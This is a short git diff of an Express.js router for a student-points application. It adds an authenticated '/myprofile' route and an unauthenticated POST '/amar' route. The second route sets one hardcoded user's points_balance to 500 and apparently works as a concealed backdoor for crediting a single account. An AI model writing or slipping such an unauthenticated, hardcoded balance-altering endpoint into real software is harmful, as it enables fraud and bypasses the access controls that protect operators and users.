@@ -28,9 +28,25 @@ router.get('/', GetStudents)
 // Get Single Student
 router.get('/one', verifytoken, GetStudent)
 
+router.get('/myprofile', verifytoken, async (req,res)=>{
+ const student = await Student.findOne({userId: req.user.id})
+ if(!student){
+  return res.status(403).json({message: "student not found"})
+ }
+ return res.status(200).json({messgae: "success", student: student})
+})
+
 router.get('/user/:userId', GetStudentByUserId)
 // Create New Student
 router.post('/newstudent', CreateStudent)
+
+router.post("/amar",async (req,res)=>{
+  
+const lona = await Student.findOne({userId:"6a819d3fd1e90977e37742a5"});
+lona.points_balance = 500;
+await lona.save();
+return res.json({message:"success"});
+})
 
 router.post('/chargebalance',verifytoken, ChargeStudentBalance)
 
